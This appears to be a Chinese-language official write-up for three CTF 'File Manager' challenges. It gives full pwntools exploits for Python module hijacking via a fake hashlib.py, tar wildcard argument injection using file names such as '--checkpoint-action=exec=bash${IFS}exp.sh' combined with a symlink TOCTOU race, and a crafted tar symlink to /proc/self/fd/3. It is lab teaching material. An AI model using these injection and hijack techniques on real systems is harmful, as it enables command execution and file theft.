---
title: File Manager Official Writeup
tags:
  - misc
  - pwn
  - CTF
categories:
  - Cyber
  - CTF Writeup
cover:
---

# 題目資訊

- **Challenge Repo:** [r3xdj/file-manager-challs](https://github.com/r3xdj/file-manager-challs)

> 如何開啟題目：`git clone` 完整題目後，進入各題資料夾，執行
> 
> ```bash
> docker-compose up --build
> ```
> 
> 三題分別會開在 localhost 的 port 10001, 10002, 10003。
> 
> 接著即可用 `nc` 或 `pwntools remote` 連入。
> 註：建議在 Linux 或 WSL 中操作

> 其實我是打算當黑箱題的XD

# Writeup

## File Manager 1

分類：Pwn / Misc

難度：Easy

```
Welcome to the file manager!
You can read files, calculate their hash, and create new files.

Flag Format: ZLCSC{*}
```

首先連入題目

```bash
nc localhost 10001
```

會出現一個選單

```
Welcome to the file manager!
You can read files, calculate their hash, and create new files.
Please be careful when creating files, as it may overwrite existing files.
Enjoy!
==============================
Welcome to the file manager!
==============================
1. read file
2. calculate hash
3. create file
4. exit
>>
```

### 首要的思路

我們先試著輸入`1`，看能不能讀取flag.txt

```
>> 1
filename: flag.txt
Please enter a valid filename without spaces or special characters, and less than 255 characters, and not 'flag.txt'.
```

沒有辦法。接著試著用**不同的檔案名稱**，如`flag.*`、`./flag.txt`，看能不能繞過。但經測試後發現都會因為包含特殊符號而被擋掉，我們只好另闢蹊徑。

### 程式碼洩漏

下一階段的想法是試圖leak出程式碼，這樣我們便能直接分析出那裡有漏洞。
為此，我們需要先弄清楚這個主程式的檔名。
在選單中輸入`3`

> 想法：一開始提到「用Create file功能要特別小心，因為可能覆蓋現有檔案」，那程式應該會阻止我們建立檔案名稱與主程式名稱相同的檔案。

```
>> 3
You will be asked for line (<=10), text and filename. The text will be written into the file for the number of lines you specified.
For example, if you enter 3 for line, and 'hello' for text, and 'text.txt' for filename, the file 'text.txt' will contain:
hello
hello
hello
And remember, the filename should not contain any spaces or special characters such as '/', '\', ':', '*', '?', '"', '<', '>', '|'.
And the filename should not be too long (less than 255 characters).
Also, it can't be 'main.py' or 'flag.txt' to avoid breaking the program.
Caution: If you create a file with the same name as an existing file, it will overwrite the existing file!
line:
```

可以發現`Also, it can't be 'main.py' or 'flag.txt' to avoid breaking the program.`這一行，因此主程式檔名非常有可能就叫做`main.py`。
我們這裡就先隨意建立一個空檔案以回到主選單

```
line: 1
line 1:
filename: trash
File created successfully!
```

回到主選單後我們便能使用`1. Read file`功能取得程式碼內容：

```python
#!/usr/bin/env python3
import os, sys

def init():
        sys.stdout.reconfigure(line_buffering=True)
        sys.stderr.reconfigure(line_buffering=True)
        os.system("stty -echo")

def Welcome():
        print("Welcome to the file manager!")
        print("You can read files, calculate their hash, and create new files.")
        print("Please be careful when creating files, as it may overwrite existing files.")
        print("Enjoy!")

def banner():
        print("="*30)
        print("Welcome to the file manager!")
        print("="*30)

check_filename = lambda fn, files: any(c in fn for c in " /\\:*?\"<>|") or len(fn) > 255 or os.path.basename(os.path.realpath(fn)) in files
file_exists = lambda fn: os.path.exists(fn)

def readfile(fn):
        if check_filename(fn, ["flag.txt"]):
                print("Please enter a valid filename without spaces or special characters, and less than 255 characters, and not 'flag.txt'.")
                return 1
        if not file_exists(fn):
                print("File does not exist!")
                return 1
        else:
                with open(fn, "r") as f:
                        print("Here is the content of the file:")
                        print(f.read())

def get_hash(filename):
        import hashlib
        sha256 = hashlib.sha256
        file = open(filename, "rb").read()
        return sha256(file)

def calhash(fn):
        if not file_exists(fn):
                print("File does not exist!")
                return 1
        else:
                print("Calculating hash...")
                print("The hash of the file is: " + str(get_hash(fn).hexdigest()))

def create_file_banner():
        print("You will be asked for line (<=10), text and filename. The text will be written into the file for the number of lines you specified.")
        print("For example, if you enter 3 for line, and 'hello' for text, and 'text.txt' for filename, the file 'text.txt' will contain:")
        print("hello")
        print("hello")
        print("hello")
        print("And remember, the filename should not contain any spaces or special characters such as '/', '\\', ':', '*', '?', '\"', '<', '>', '|'.")
        print("And the filename should not be too long (less than 255 characters).")
        print("Also, it can't be 'main.py' or 'flag.txt' to avoid breaking the program.")
        print("Caution: If you create a file with the same name as an existing file, it will overwrite the existing file!")

def createfile():
        create_file_banner()
        line = input("line: ")
        if not line.isdigit() or int(line) <= 0:
                print("Please enter a valid positive integer for line.")
                print("File creation failed!")
                return 1
        elif int(line) > 10:
                print("Please enter a smaller number for line (less than 10).")
                print("File creation failed!")
                return 1
        else:
                line = int(line)
        text = ""
        for i in range(line):
                text += input(f"line {i+1}: ") + "\n"
        while True:
                filename = input("filename: ")
                if check_filename(filename, ["main.py", "flag.txt"]):
                        print("Please enter a valid filename without spaces or special characters, and less than 255 characters, and not 'main.py' or 'flag.txt'.")
                else:
                        break
        with open(filename, "w") as f:
                f.write(text)
                print("File created successfully!")

def run():
        while True:
                banner()
                print("1. read file")
                print("2. calculate hash")
                print("3. create file")
                print("4. exit")
                ch = input(">> ")
                if ch == "1":
                        fn = input("filename: ")
                        readfile(fn)
                elif ch == "2":
                        fn = input("filename: ")
                        calhash(fn)
                elif ch == "3":
                        createfile()
                elif ch == "4":
                        print("Thank you for using the file manager!")
                        break
                print()


if __name__ == "__main__":
        init()
        Welcome()
        run()
```

### 程式碼漏洞分析

這裡我們注意到`get_hash()`這個函式~~(題目莫名的有這個功能，代表這裡一定有什麼跟解題相關的東西嘛)~~，是在函式之中才`import hashlib`。於是我們可以在檔案載入`hashlib`之前(也就是初次使用`2. calculate hash`)，先自己建立一個惡意的`hashlib.py`以達到Python Module Hijack。

> 這裡要說一下 Python 的 import 找模組過程：
> 
> 1. 尋找 `sys.modules` 中是否已有該模組(aka看該模組是否已載入過)
> 2. 找 Python 內建模組(如sys, time等)
> 3. 按照 `sys.path` 中的資料夾依序尋找，順序如下
>    1. **目前工作目錄** <-- ***我們建立的惡意 hashlib.py 在這裡***
>    2. 環境變數 `PYTHONPATH` 中指定的目錄
>    3. 標準函式庫(如os, json等) <-- ***hashlib 在這裡***
>    4. site-packages(pip安裝的模組)
> 
> 這也是我們的Python Module Hijack可以奏效的原因。

因此目前解題思路就清晰了：用`3. create file`功能建立惡意的`hashlib.py`，然後用`2. calculate hash` 去「計算`flag.txt`的Hash(其實是讀取並印出其中內容)」。

### 寫 exploit

首先構造`hashlib.py`。我們要偽造一個惡意的sha256函式(因main.py中第39行是調用sha256函式)，讓他被執行時原封不動地返回餵給他的原始內容，且須適用hexdigest方法。構造如下：

```python
class sha256:
    def __init__(self, data):
        self.data = data
    def hexdigest(self):
        return self.data.decode('utf-8', errors='ignore')
```

剩下的便是寫出「建立檔案」和「觸發計算hash功能」的程式碼啦！

完整exploit如下：

```python
#!/usr/bin/env python3
from pwn import *

p = remote("localhost", 10001)

def create_file(filename, content):
    p.sendlineafter(b">> ", b"3")  # 選擇建立檔案
    p.sendlineafter(b"line: ", str(len(content)).encode())  # 輸入行數
    for i, line in enumerate(content):
        p.sendlineafter(f"line {i+1}: ".encode(), line)  # 逐行輸入內容
    p.sendlineafter(b"filename: ", filename)  # 輸入檔名

def calculate_hash(filename):
    p.sendlineafter(b">> ", b"2")  # 選擇計算 hash
    p.sendlineafter(b"filename: ", filename)  # 輸入檔名
    p.recvuntil(b"The hash of the file is: ")
    return p.recvline().strip().decode('utf-8')  # 接收並解碼 hash 結果

# ==========================================
# 步驟 1：利用「建立檔案」功能，偽造 hashlib.py
# ==========================================
# 設計 Payload：我們需要建立一個帶有 hexdigest() 方法的 sha256 class
# 這樣當 main.py 呼叫 sha256(file).hexdigest() 時，就會直接回傳 file (即 flag 內容)
payload = [
    b"class sha256:",
    b"    def __init__(self, data):",
    b"        self.data = data",
    b"    def hexdigest(self):",
    b"        return self.data.decode('utf-8', errors='ignore')" # 將 bytes 解碼為字串方便閱讀
]

create_file(b"hashlib.py", payload)

# ==========================================
# 步驟 2：觸發 calhash 讀取 flag.txt
# ==========================================

flag = calculate_hash(b"flag.txt")

print(f"\n[+] Exploit 成功！獲取到 Flag: {flag}")

p.close()
```

得到Flag：

```
ZLCSC{w45n7_1_C41cU1471nG_7h3_H45h?!?!}
```

## File Manager 2

分類：Pwn / Misc

難度：Hard

```
I've fixed the vulnerability in the previous version!
Also, I introduce a new "Backup" feature!

Flag Format: ZLCSC{*}
```

### 程式碼洩漏

用跟之前一樣的方式，用`1. read file`功能讀`main.py`，可得程式碼如下：

```python
#!/usr/bin/env python3
import os, hashlib, time, sys

def init():
    sys.stdout.reconfigure(line_buffering=True)
    sys.stderr.reconfigure(line_buffering=True)
    os.system("stty -echo")

def new_welcome():
    print("Welcome to the file manager 2!")
    print("I've fixed the vulnerability in the previous version (I won't be hacked again haha), deleted some unnecessary code, and added some new features.")
    print("You can read files, calculate their hash, and create new files.")
    print("And now, you can also create a backup of all the files in the current directory by using the 'backup' option!")
    print("Please be careful when creating files, as it may overwrite existing files.")
    print("Enjoy!")

def banner():
    print("="*30)
    print("Welcome to the file manager!")
    print("="*30)

check_filename = lambda fn, files: any(c in fn for c in " /\\:*?\"<>|") or len(fn) > 255 or os.path.basename(os.path.realpath(fn)) in files
file_exists = lambda fn: os.path.exists(fn)

ROOT_UID = 0
ROOT_GID = 0
CTF_UID = 1000
CTF_GID = 1000

def drop_priv():
    os.setresgid(CTF_GID, CTF_GID, ROOT_GID)
    os.setresuid(CTF_UID, CTF_UID, ROOT_UID)

def restore_priv():
    os.setresuid(ROOT_UID, ROOT_UID, CTF_UID)
    os.setresgid(ROOT_GID, ROOT_GID, CTF_GID)

def readfile(fn):
    if check_filename(fn, ["flag.txt"]):
        print("Please enter a valid filename without spaces or special characters, and less than 255 characters, and not 'flag.txt'.")
        return 1
    if check_filename(fn, ["backup.tar"]):
        print("Backup file is not a text file and cannot be read!")
        return 1
    print(f"[*] Auditing access to {fn}...")
    time.sleep(0.1)
    if not file_exists(fn):
        print("File does not exist!")
        return 1
    else:
        with open(fn, "r") as f:
            print("Here is the content of the file:")
            print(f.read())

def get_hash(filename):
    sha256 = hashlib.sha256
    file = open(filename, "rb").read()
    return sha256(file)

def calhash(fn):
    if not file_exists(fn):
        print("File does not exist!")
        return 1
    else:
        print("Calculating hash...")
        print("The hash of the file is: " + str(get_hash(fn).hexdigest()))

def create_file_banner():
    print("You will be asked for line (<=10), text and filename. The text will be written into the file for the number of lines you specified.")
    print("For example, if you enter 3 for line, and 'hello' for text, and 'text.txt' for filename, the file 'text.txt' will contain:")
    print("hello")
    print("hello")
    print("hello")
    print("And remember, the filename should not contain any spaces or special characters such as '/', '\\', ':', '*', '?', '\"', '<', '>', '|'.")
    print("And the filename should not be too long (less than 255 characters).")
    print("Also, it can't be 'main.py' or 'flag.txt' to avoid breaking the program.")
    print("Caution: If you create a file with the same name as an existing file, it will overwrite the existing file!")

def createfile():
    create_file_banner()
    line = input("line: ")
    if not line.isdigit() or int(line) <= 0:
        print("Please enter a valid positive integer for line.")
        print("File creation failed!")
        return 1
    elif int(line) > 10:
        print("Please enter a smaller number for line (less than 10).")
        print("File creation failed!")
        return 1
    else:
        line = int(line)
    text = ""
    for i in range(line):
        text += input(f"line {i+1}: ") + "\n"
    while True:
        filename = input("filename: ")
        if check_filename(filename, ["main.py", "flag.txt"]):
            print("Please enter a valid filename without spaces or special characters, and less than 255 characters, and not 'main.py' or 'flag.txt'.")
        else:
            break
    drop_priv()
    with open(filename, "w") as f:
        f.write(text)
        print("File created successfully!")
    restore_priv()

def backup():
    print("Creating backup...")
    drop_priv()
    if file_exists("backup.tar"):
        print("Backup file already exists, it will be overwritten!")
        os.remove("backup.tar")
    try:
        os.system("tar -cf backup.tar --exclude=flag.txt --exclude=main.py *")
        print("Backup created successfully!")
    except Exception as e:
        print(f"An error occurred while creating backup: {e}")
    finally:
        restore_priv()

def run():
    while True:
        banner()
        print("1. read file")
        print("2. calculate hash")
        print("3. create file")
        print("4. backup (Won't backup flag.txt, main.py)")
        print("5. restore backup (in development)")
        print("999. exit")
        ch = input(">> ")
        if ch == "1":
            fn = input("filename: ")
            readfile(fn)
        elif ch == "2":
            fn = input("filename: ")
            calhash(fn)
        elif ch == "3":
            createfile()
        elif ch == "4":
            backup()
        elif ch == "5":
            print("Restore backup feature is still in development, please wait for the next version!")
        elif ch == "999":
            print("Thank you for using the file manager!")
            break


if __name__ == "__main__":
    init()
    new_welcome()
    run()
```

我們可以看到這次程式在一開始就import hashlib了，於是解決先前的module hijack漏洞。

### `readfile()` 時間延遲和權限調整

不難注意到，這個版本的File Manager多了`drop_priv()`和`restore_priv`兩個函式，且`readfile()`函式在確定檔名後會先`sleep`0.1秒才讀取檔案。不難聯想到可能有TOCTOU漏洞。如果在檔名檢查過了到讀取檔案內容的這0.1秒鐘我們能調換內容，就能讓`readfile()`去讀本來不該讀的`flag.txt`。

> TOCTOU(Time-of-Check to Time-of-Use)是一個Race condition的一種，邏輯就是檢查到使用檔案過程中有個時間差，我們在這段時間差中間做一些事情，讓檢查時跟最後使用的檔案不一樣。

想法如下：建立一個連結一開始指向，`dummy.txt`，接著用`1. read file`去讀這個連結，在這0.1秒的延遲中再將連結指向改成`flag.txt`。

> 由於readfile用到的 `check_filename` 匿名函式的檢查機制很嚴(`os.path.basename(os.path.realpath(fn))` 會去追捷徑指向的原始檔案是什麼)，因此我們沒辦法單純靠建立捷徑解出此題。

### 建立檔案

為了實現我們的想法，我們需要能有個腳本跑無窮迴圈，不斷的切換連結指向，同時我們不斷試著讀取這個連結檔案。

因此，我們用`3. create file`功能建立以下兩個檔案：

1. dummy.txt：用來佔位、讓連結指向在此與`flag.txt`來回交替

2. exp.sh：無窮迴圈腳本，用來切換連結指向

以下為`exp.sh`內容：

```shell
#!/bin/bash
while true; do
  ln -sf dummy.txt a
  ln -sf flag.txt a
done &
```

### Tar Argument Injection

現在我們只差最後一步：執行我們的`exp.sh`。但程式碼並沒有提供我們執行檔案的功能。於是我們需要運用Command Injection或Argument Injection的技巧。

注意到第114行：

```python
os.system("tar -cf backup.tar --exclude=flag.txt --exclude=main.py *")
```

直接用了`*`。而萬用字元`*`會把當前目錄底下的檔案名稱全部展開。

參見 [tar | Argument Injection Vectors](https://sonarsource.github.io/argument-injection-vectors/binaries/tar/)，我們知道這段程式碼可以Argument Injection。因此我們需要建立兩個檔案，名稱分別為：

1. `--checkpoint=1`

2. `--checkpoint-action=exec=bash exp.sh`

但這裡有個問題，`check_filename`函式會擋檔名中的空白字元。不過我們可以用`${IFS}`繞過。因此兩個檔案名稱為：

1. `--checkpoint=1`

2. `--checkpoint-action=exec=bash${IFS}exp.sh`

> 為什麼我們無法直接用`exp.sh`去讀取`flag.txt`呢？各位可以自己試一試，會發現權限不足。實際上我在Dockerfile中寫`flag.txt`的權限是400，也就是只有root可讀。而可以看到第109行，程式在跑tar之前就先`drop_priv`了。

### 寫 exploit

全部分析完之後，就只剩下寫exploit了。

完整exploit如下：

```python
#!/usr/bin/env python3
from pwn import *

p = remote("localhost", 10002)

def readfile(filename):
    p.sendlineafter(b">> ", b"1")  # 選擇讀取檔案
    p.sendlineafter(b"filename: ", filename)  # 輸入檔名
    response = p.recvuntil(b"Here is the content of the file:").decode('utf-8')
    if "File does not exist!" in response:
        print("[!] File does not exist!")
        return None
    elif "Please enter a valid filename" in response:
        print("[!] Invalid filename!")
        return None
    else:
        content = p.recvline().decode('utf-8')  # 接收並解碼檔案內容
        return content.strip()  # 去除多餘的空白字符

def create_file(filename, content):
    p.sendlineafter(b">> ", b"3")  # 選擇建立檔案
    p.sendlineafter(b"line: ", str(len(content)).encode())  # 輸入行數
    for i, line in enumerate(content):
        p.sendlineafter(f"line {i+1}: ".encode(), line)  # 逐行輸入內容
    p.sendlineafter(b"filename: ", filename)  # 輸入檔名

def calculate_hash(filename):
    p.sendlineafter(b">> ", b"2")  # 選擇計算 hash
    p.sendlineafter(b"filename: ", filename)  # 輸入檔名
    p.recvuntil(b"The hash of the file is: ")
    return p.recvline().strip().decode('utf-8')  # 接收並解碼 hash 結果

def backup_file():
    p.sendlineafter(b">> ", b"4")  # 選擇備份檔案

def get_shell():
    create_file(b"--checkpoint=1", [b""])  # 建立特殊名稱的檔案
    create_file(b"--checkpoint-action=exec=bash", [b""])  # 建立特殊名稱的檔案
    backup_file()  # 執行備份，觸發 tar 的 checkpoint-action注入，獲得 shell


# ==========================================================
# 步驟 1：利用「建立檔案」功能，建立將用來占位的dummy.txt檔案
# ==========================================================

log.info("建立 dummy.txt 檔案...")
create_file(b"dummy.txt", [b""])  # 建立 dummy.txt 檔案

# ============================================================
# 步驟 2：利用「建立檔案」功能，建立能不斷切換連結指向的腳本exp.sh
# ============================================================

log.info("建立 exp.sh 檔案...")
toctou_script = [
    b'#!/bin/bash',
    b'while true; do',
    b'  ln -sf dummy.txt a',
    b'  ln -sf flag.txt a',
    b'done &'
]
create_file(b"exp.sh", toctou_script)  # 建立 exp.sh 檔案

# ==============================================================
# 步驟 3：利用「建立檔案」功能，建立特殊名稱的檔案，以觸發tar參數注入
# ==============================================================

log.info("建立--checkpoint=1 和 --checkpoint-action=exec=bash${IFS}exp.sh 檔案...")
create_file(b"--checkpoint=1", [b""])  # 建立特殊名稱的檔案
create_file(b"--checkpoint-action=exec=bash${IFS}exp.sh", [b""])  # 建立特殊名稱的檔案

# ==============================================================
# 步驟 4：利用「備份檔案」功能，觸發 tar 的 checkpoint-action 注入，執行 exp.sh
# ==============================================================

log.info("觸發 tar 的 checkpoint-action 注入，執行 exp.sh...")
backup_file()

# ==============================================================
# 步驟 5：利用「讀取檔案」功能，利用TOCTOU漏洞，讀取 a 檔案的內容，獲取 flag
# ==============================================================

log.info("利用 TOCTOU 漏洞，讀取 a 檔案的內容，獲取 flag...")

while True:
    # 送出讀取請求
    p.sendline(b"1")
    p.sendline(b"a")

    # 接收一段輸出，看是否有 FLAG
    # 設定一個很短的 timeout，如果沒讀到就立刻重來
    data = p.recv(timeout=0.1) 

    if b"ZLCSC{" in data:
        flag = re.findall(r"ZLCSC\{.*?\}", data.decode(errors='ignore'))
        if flag:
            log.success(f"成功取得 Flag: {flag[0]}")
            break

    # 如果失敗，伺服器會回到 >> 選單，我們繼續下一次循環

print()
ch = input("Get shell?[y/n] ")

if ch.lower() == 'y' or ch == '': # y 或 Enter 都行
    get_shell()
    p.interactive()
else:
    p.close()
```

很快的，我們就可以得到Flag了。同理其實也可以get shell，只是shell的權限很低就是了。

```
ZLCSC{OH_8R0_y0u_YOU_tRE4tED_8@cKup_@s_b4cKD0Or}
```

## File Manager 3

分類：Pwn / Misc

難度：Hard

```
I can't believe it... my file manager got pwned TWICE already.
Anyway, I've fixed everything this time.
By the way, the backup restore feature is finally here!

Flag Format: ZLCSC{*}
```

### 程式碼洩漏

老規矩，先leak code：

```python
#!/usr/bin/env python3
import os, hashlib, time, sys, subprocess

def init():
	sys.stdout.reconfigure(line_buffering=True)
	sys.stderr.reconfigure(line_buffering=True)
	os.system("stty -echo")

def new_welcome():
	print("Welcome to the file manager 3!")
	print("I can't believe it... my file manager got pwned TWICE already.\nSeriously, how did you guys even do that?\n")
	print("Anyway, I've fixed everything this time.\nThere's now a proper permission authentication system, and deleted flag.txt at very start,\nso you definitely can't access files you shouldn't. :)\n")
	print("Also, great news!\nThe backup restore feature is finally here (beta version)!")
	print("Enjoy the new version!\n")

	print("Hint 1: Is there any difference in 'check_filename' function?")
	print("Hint 2: You may want to see the 'Dockerfile' first\n")

def banner():
	print("="*30)
	print("Welcome to the file manager!")
	print("="*30)

check_filename = lambda fn, files: any(c in fn for c in " /\\:*?\"<>|") or len(fn) > 255 or os.path.basename(fn) in files
file_exists = lambda fn: os.path.exists(fn)

ROOT_UID = 0
ROOT_GID = 0
CTF_UID = 1000
CTF_GID = 1000

is_root = False

def drop_priv():
    global is_root
    os.setresgid(CTF_GID, CTF_GID, ROOT_GID)
    os.setresuid(CTF_UID, CTF_UID, ROOT_UID)
    is_root = False

def restore_priv():
    global is_root
    os.setresuid(ROOT_UID, ROOT_UID, CTF_UID)
    os.setresgid(ROOT_GID, ROOT_GID, CTF_GID)
    is_root = True

def readfile(fn):
	if check_filename(fn, [""]): print("Please enter a valid filename without spaces or special characters, and less than 255 characters"); return 1
	if check_filename(fn, ["backup.tar"]):
		print("Backup file is not a text file and cannot be read!"); return 1
	print(f"[*] Auditing access to {fn}...")
	time.sleep(0.1)
	if not file_exists(fn):
		print("File does not exist!")
		return 1
	else:
		with open(fn, "r") as f:
			print("Here is the content of the file:")
			print(f.read())
		
def get_hash(filename):
	sha256 = hashlib.sha256
	file = open(filename, "rb").read()
	return sha256(file)
		
def calhash(fn):
	if not file_exists(fn):
		print("File does not exist!")
		return 1
	else:
		print("Calculating hash...")
		print("The hash of the file is: " + str(get_hash(fn).hexdigest()))

def create_file_banner():
	print("You will be asked for line (<=10), text and filename. The text will be written into the file for the number of lines you specified.")
	print("For example, if you enter 3 for line, and 'hello' for text, and 'text.txt' for filename, the file 'text.txt' will contain:")
	print("hello")
	print("hello")
	print("hello")
	print("And remember, the filename should not contain any spaces or special characters such as '/', '\\', ':', '*', '?', '\"', '<', '>', '|'.")
	print("And the filename should not be too long (less than 255 characters).")
	print("Also, it can't be 'main.py' or 'flag.txt' to avoid breaking the program.")
	print("Caution: If you create a file with the same name as an existing file, it will overwrite the existing file!")

def createfile():
	create_file_banner()
	line = input("line: ")
	if not line.isdigit() or int(line) <= 0:
		print("Please enter a valid positive integer for line.")
		print("File creation failed!")
		return 1
	elif int(line) > 10:
		print("Please enter a smaller number for line (less than 10).")
		print("File creation failed!")
		return 1
	else:
		line = int(line)
	text = ""
	for i in range(line):
		text += input(f"line {i+1}: ") + "\n"
	while True:
		filename = input("filename: ")
		if check_filename(filename, ["main.py", "flag.txt"]):
			print("Please enter a valid filename without spaces or special characters, and less than 255 characters, and not 'main.py' or 'flag.txt'.")
		else:
			break
	with open(filename, "w") as f:
		f.write(text)
		print("File created successfully!")

def backup():
	print("Creating backup...")
	if file_exists("backup.tar"):
		print("Backup file already exists, it will be overwritten!")
		os.remove("backup.tar")
	try:
		subprocess.run(["tar", "-cf", "backup.tar", "--exclude=flag.txt", "--exclude=main.py", "--", "."])
		print("Backup created successfully!")
	except Exception as e:
		print(f"An error occurred while creating backup: {e}")

def restore():
	ch = input("Are you sure? this might replace existed files? type \"yes\" to continue: ")
	if not ch.lower() == "yes": return 1
	print("Restoring backup...")
	if not file_exists("backup.tar"):
		print("Backup file does not exist!")
		return 1
	try:
		subprocess.run(["tar", "-xf", "backup.tar"])
		print("Backup restored successfully!")
	except Exception as e:
		print(f"An error occurred while restoring backup: {e}")

def run():
	global is_root
	auth = open("flag.txt", "r")
	os.remove("flag.txt")
	drop_priv()
	while True:
		banner()
		print("1. read file")
		print("2. calculate hash")
		print("3. create file")
		print("4. backup (Won't backup flag.txt, main.py)")
		print("5. restore backup (beta)")
		print("6. Get root" if is_root == False else "6. Drop priv.")
		print("999. exit")
		ch = input(">> ")
		if ch == "1":
			fn = input("filename: ")
			readfile(fn)
		elif ch == "2":
			fn = input("filename: ")
			calhash(fn)
		elif ch == "3":
			createfile()
		elif ch == "4":
			backup()
		elif ch == "5":
			restore()
		elif ch == "6":
			if is_root == False:
				auth_key = input("Enter the whole flag as the auth key >> ")
				auth.seek(0)
				if auth_key == auth.read(): restore_priv(); print("You're now root!")
				else: print("auth key error.")
			else:
				drop_priv()
		elif ch == "999":
			print("Thank you for using the file manager!")
			break


if __name__ == "__main__":
	init()
	new_welcome()
	run()

# Bonus question: What unexpected solution would occur if auth.seek(0) were not used?
```

哦，這次有兩個提示

### `file_namecheck()` 函式

```python
check_filename = lambda fn, files: any(c in fn for c in " /\\:*?\"<>|") or len(fn) > 255 or os.path.basename(fn) in files
```

我們可以看到這次`check_filename()`對於檔案連結的檢查比較鬆。少了`os.path.realpath(fn)`，`check_filemame`便不會處理符號連結。因此這次用連結來讀檔是可行的

### Dockerfile

按照提示2，用`1. read file`讀出如下內容：

```dockerfile
FROM python:3.11-slim

RUN useradd -ms /bin/bash ctf

WORKDIR /home/ctf/file_manager_3

COPY main.py flag.txt Dockerfile ./ 

RUN chown -R ctf:ctf /home/ctf/file_manager_3 \
    && chmod 755 /home/ctf/file_manager_3 \
    && chown root:root flag.txt \
    && chmod 444 flag.txt \
    && chown root:root main.py \
    && chmod 544 main.py

USER root

CMD ["python3", "-u", "main.py"]
```

我們發現這次普通用戶也有權限讀取`flag.txt`。

### Get root

這個版本加入了一個`get root`功能，輸入正確完整的flag就可以得到root喔~

> 我有個朋友問AI，結果AI叫他Timing attack

但我們還不知道Flag的內容怎麼get root呢，但程式既然需要知道flag是什麼，就會先開`flag.txt`，因此我們可以往下繼續探索……

### 檔案沒close()

在第136行可見程式`open()`了`flag.txt`但沒`close()`，隨後在第137行便刪除了`flag.txt`(你刪了我怎麼讀嘛😭)

ㄟ，還真的可以！想想為什麼學python的時候老師都跟我們說要記得關檔案呢？

`os.remove()`底層跑的其實是`unlink()`這個syscall。

我們在[unlink(2) - Linux manual page](https://man7.org/linux/man-pages/man2/unlink.2.html)可以查到

```
unlink() deletes a name from the filesystem.  If that name was the
last link to a file and no processes have the file open, the file
is deleted and the space it was using is made available for reuse.

If the name was the last link to a file but any processes still
have the file open, the file will remain in existence until the
last file descriptor referring to it is closed.

If the name referred to a symbolic link, the link is removed.

If the name referred to a socket, FIFO, or device, the name for it
is removed but processes which have the object open may continue
to use it.
```

因此雖然檔案看似被刪除了，但是因為他沒有被`close()`，所以實際上檔案的 Inode 依然存在，只是檔名被移除了。因此我們可以藉由`/proc/self/fd/3`這個檔案來讀取出原先`flag.txt`裡的內容。

> FD編號：
> 
> - **`0` —— 標準輸入（Standard Input / `stdin`）**：預設接收來自鍵盤的輸入。
> 
> - **`1` —— 標準輸出（Standard Output / `stdout`）**：預設將程式執行的正常結果輸出到螢幕。
> 
> - **`2` —— 標準錯誤（Standard Error / `stderr`）**：預設將程式發生的錯誤訊息輸出到螢幕。
> 
> 所以檔案執行過程中被開啟的第一個檔案，FD編號會是`3`

> 其他關於 `/proc`的簡單補充可見[Proc 目录在 CTF 中的利用-安全KER - 安全资讯平台](https://www.anquanke.com/post/id/241148)

### 建立檔案連結

我們接著就是要想辦法去讀取`/proc/self/fd/3`。但由於我們輸入檔名時不能包含特殊符號，我們無法直接將這串路徑餵給`1. read file`。

ㄟ，還記得這次`check_filename()`管的比較鬆嗎？看來我們可以建立一個檔案連結指向`/proc/self/fd/3`，然後再讀取這個檔案連結即可。

問題是要怎麼建立出檔案連結呢？我們又不能跑`ln`指令。

答案是

構造一個tar file出來。

可以用tarfile跟io這兩個模組

```python
import tarfile, io
out = io.BytesIO() # 在記憶體中操作，這樣就不用真的把backup.tar存在本地硬碟
with tarfile.open(fileobj=out, mode="w") as tar:
        info = tarfile.TarInfo(name="a")
        info.type = tarfile.SYMTYPE
        info.linkname = "/proc/self/fd/3" # a --> /proc/self/fd/3
        tar.addfile(info)
tar_data = [out.getvalue()]
```



### 寫 exploit

完整exploit如下：

```python
#!/usr/bin/env python3
from pwn import *
import tarfile, io

p = remote("localhost", 10003)

def readfile(filename):
    p.sendlineafter(b">> ", b"1")  # 選擇讀取檔案
    p.sendlineafter(b"filename: ", filename)  # 輸入檔名
    response = p.recvuntil(b"Here is the content of the file:\n").decode('utf-8')
    if "File does not exist!" in response:
        print("[!] File does not exist!")
        return None
    elif "Please enter a valid filename" in response:
        print("[!] Invalid filename!")
        return None
    else:
        content = p.recvline().decode('utf-8')  # 接收並解碼檔案內容
        return content.strip()  # 去除多餘的空白字符

def create_file(filename, content):
    p.sendlineafter(b">> ", b"3")  # 選擇建立檔案
    p.sendlineafter(b"line: ", str(len(content)).encode())  # 輸入行數
    for i, line in enumerate(content):
        p.sendlineafter(f"line {i+1}: ".encode(), line)  # 逐行輸入內容
    p.sendlineafter(b"filename: ", filename)  # 輸入檔名

def calculate_hash(filename):
    p.sendlineafter(b">> ", b"2")  # 選擇計算 hash
    p.sendlineafter(b"filename: ", filename)  # 輸入檔名
    p.recvuntil(b"The hash of the file is: ")
    return p.recvline().strip().decode('utf-8')  # 接收並解碼 hash 結果

def backup_file():
    p.sendlineafter(b">> ", b"4")  # 選擇備份檔案

def restore_file():
    p.sendlineafter(b">> ", b"5")  # 選擇還原備份
    p.sendlineafter(b": ", b"yes")

# ==========================================================
# 步驟 1：構造惡意backup.tar
# ==========================================================

log.info("構造 backup.tar 檔案...")
out = io.BytesIO() # 在記憶體中操作，這樣就不用真的把backup.tar存在本地硬碟
with tarfile.open(fileobj=out, mode="w") as tar:
        info = tarfile.TarInfo(name="a")
        info.type = tarfile.SYMTYPE
        info.linkname = "/proc/self/fd/3" # a --> /proc/self/fd/3
        tar.addfile(info)
tar_data = [out.getvalue()]

# ============================================================
# 步驟 2：利用「建立檔案」功能，建立backup.tar
# ============================================================

log.info("在伺服器端建立 backup.tar 檔案...")
create_file(b"backup.tar", tar_data)

# ==============================================================
# 步驟 3：利用「還原備份」功能，解壓縮backup.tar
# ==============================================================

log.info("解壓縮 backup.tar")
restore_file()

# ==============================================================
# 步驟 4：利用「讀取檔案」功能獲取 flag
# ==============================================================

log.info("利用 a --> /proc/self/fd/3，讀取 a 檔案的內容，獲取 flag...")

flag = readfile(b"a")
if "ZLCSC{" in flag:
    log.success(f"成功取得 Flag: {flag}")
else: print("哭了，不知道為什麼沒有Flag")

p.close()
```

### Bonus Question

檔案最後一行用註釋寫了一個Bonus Question

```
Bonus question: What unexpected solution would occur if auth.seek(0) were not used?
```



# 心得與後記
